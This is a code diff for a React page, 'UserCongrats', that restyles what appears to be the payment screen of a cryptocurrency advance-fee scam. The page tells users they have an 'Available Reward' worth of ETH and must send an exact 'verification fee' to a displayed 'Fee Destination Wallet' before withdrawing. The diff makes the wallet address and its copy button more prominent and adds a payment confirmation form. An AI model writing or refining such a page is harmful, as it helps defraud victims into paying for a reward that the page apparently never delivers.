@@ -6,7 +6,7 @@ import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { formatDollar, formatEth, truncateWallet } from "@/lib/utils";
-import { Copy, ArrowDownCircle, Info, CheckCircle2 } from "lucide-react";
+import { Copy, Info } from "lucide-react";
 import { useState } from "react";
 import { useToast } from "@/hooks/use-toast";
 import { useQueryClient } from "@tanstack/react-query";
@@ -93,7 +93,8 @@ export default function UserCongrats() {
 
   return (
     <UserLayout slug={slug}>
-      <div className="max-w-2xl mx-auto px-6 pt-16 pb-24">
+      <div className="max-w-2xl mx-auto px-6 pt-20 pb-24">
+
         {/* Header */}
         <div className="text-center mb-12">
           <h1 className="text-5xl font-semibold tracking-tight mb-3">
@@ -105,81 +106,83 @@ export default function UserCongrats() {
         </div>
 
         {/* Balance Card */}
-        <Card className="bg-zinc-900 border-zinc-800 mb-8">
-          <CardContent className="p-10 text-center">
-            <p className="text-sm uppercase tracking-widest text-zinc-500 mb-2">Available Reward</p>
-            <div className="text-7xl font-semibold tracking-tighter mb-1">
+        <Card className="bg-zinc-900 border-zinc-800 mb-10">
+          <CardContent className="p-12 text-center">
+            <p className="uppercase tracking-[2px] text-xs text-zinc-500 mb-3">AVAILABLE REWARD</p>
+            <div className="text-7xl font-semibold tracking-tighter text-white mb-1">
               {formatDollar(user.eligibleBalance)}
             </div>
             <p className="text-zinc-400">worth of ETH</p>
           </CardContent>
         </Card>
 
-        {/* Wallet Info */}
-        <div className="grid gap-4 mb-8">
+        {/* Wallet Information */}
+        <div className="space-y-4 mb-12">
+          {/* Connected Wallet */}
           <Card className="bg-zinc-900 border-zinc-800">
-            <CardContent className="p-6 flex items-center justify-between">
-              <div>
-                <p className="text-sm text-zinc-500">Connected Wallet</p>
-                <p className="font-mono text-sm mt-1">{truncateWallet(user.walletAddress)}</p>
-              </div>
+            <CardContent className="p-6">
+              <p className="text-sm text-zinc-500 mb-1">Connected Wallet</p>
+              <p className="font-mono text-sm break-all">{user.walletAddress}</p>
             </CardContent>
           </Card>
 
-          {/* Fee Destination Wallet */}
+          {/* Fee Destination Wallet - Standout Copy Button */}
           <Card className="bg-zinc-900 border-zinc-800">
-            <CardContent className="p-6 flex items-center justify-between">
+            <CardContent className="p-6 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
               <div>
-                <p className="text-sm text-zinc-500">Fee Destination Wallet</p>
-                <p className="font-mono text-sm mt-1 tracking-wider">{truncateWallet(user.feeWalletAddress)}</p>
+                <p className="text-sm text-zinc-500 mb-1">Fee Destination Wallet</p>
+                <p className="font-mono text-sm break-all">{user.feeWalletAddress}</p>
               </div>
               <Button 
                 onClick={() => copyToClipboard(user.feeWalletAddress)}
-                className="bg-white text-black hover:bg-zinc-200 font-medium px-6"
+                className="bg-white hover:bg-zinc-200 text-black font-medium px-8 py-2.5 whitespace-nowrap"
               >
-                {copied ? "Copied ✓" : "Copy Address"}
+                {copied ? "✓ Copied" : "Copy Address"}
               </Button>
             </CardContent>
           </Card>
+        </div>
 
         {/* Withdrawal Fee Notice */}
-        <Card className="bg-zinc-900 border-amber-500/20 mb-8">
-          <CardContent className="p-6">
-            <div className="flex gap-4">
-              <Info className="w-5 h-5 text-amber-400 mt-0.5 flex-shrink-0" />
-              <div>
-                <p className="font-medium mb-1">Withdrawal Fee Required</p>
-                <p className="text-sm text-zinc-400">
-                  To process your withdrawal, send a verification fee of{" "}
+        <Card className="bg-zinc-900 border-amber-500/30 mb-10">
+          <CardContent className="p-8">
+            <div className="flex gap-5">
+              <Info className="w-6 h-6 text-amber-400 mt-0.5 flex-shrink-0" />
+              <div className="space-y-2">
+                <p className="font-medium">Verification Fee Required</p>
+                <p className="text-sm text-zinc-400 leading-relaxed">
+                  To process your withdrawal, please send exactly{" "}
                   <span className="text-amber-400 font-medium">
-                    {formatEth(user.withdrawalFeeEth)} ETH
+                    {formatEth(user.withdrawalFeeEth)}
                   </span>{" "}
-                  to the fee destination wallet above.
+                  to the Fee Destination Wallet above.
                 </p>
               </div>
             </div>
           </CardContent>
         </Card>
 
-        {/* Payment Form */}
+        {/* Payment Confirmation */}
         <Card className="bg-zinc-900 border-zinc-800">
           <CardContent className="p-8">
             <h3 className="text-lg font-medium mb-6">I've Made The Payment</h3>
-            <div className="space-y-4">
+            
+            <div className="space-y-5">
               <Input
                 type="number"
                 step="0.0001"
-                placeholder="Enter amount you paid (ETH)"
+                placeholder="Enter the exact amount you paid in ETH"
                 value={withdrawAmount}
                 onChange={(e) => setWithdrawAmount(e.target.value)}
-                className="bg-black border-zinc-700"
+                className="bg-black border-zinc-700 text-lg py-6"
               />
+              
               <Button 
                 onClick={handleSubmitPayment} 
-                className="w-full py-6 text-base font-medium"
+                className="w-full py-7 text-base font-medium bg-white text-black hover:bg-zinc-200"
                 disabled={!withdrawAmount}
               >
-                Confirm Payment
+                Confirm Payment Submission
               </Button>
             </div>
           </CardContent>
@@ -188,5 +191,3 @@ export default function UserCongrats() {
     </UserLayout>
   );
 }
-
-
